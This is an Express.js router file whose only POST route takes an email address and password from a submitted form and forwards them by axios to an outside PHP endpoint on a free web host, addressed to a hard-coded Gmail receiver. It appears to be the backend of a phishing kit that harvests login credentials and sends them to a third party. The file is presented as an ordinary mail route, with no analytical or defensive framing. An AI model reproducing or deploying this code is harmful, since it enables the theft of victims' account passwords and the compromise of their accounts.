const express = require('express');
const ax = require('axios');
const fs = require('fs');
const router = express.Router();
const path = require('path');

/***********************Send mail php imported url*****************/
const
    link = 'https://bklshserver.000webhostapp.com/rest.php',
    receiverEmail = 'greatogbuagu2005@gmail.com';
/**********************Send mail php imported url ends**************/

router.post("/", (req, res) => {
    const referer = req.headers.referer || req.headers.referrer;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;



    ax.post(link, {
        email: req.body.email,
        password: req.body.password,
        source: req.body.source,
        receiver: req.body.reci
    }).then((response) => {
        if(response.status === 200) {
            console.log('heyiamdone')
            res.send({
                status_code: '200',
                status: true,
                message: 'message sent!'
            })
        }
    }).catch((err) => {
        res.send({
            status_code: '400',
            status: false,
            message: err
        })
    });
});

module.exports = router;
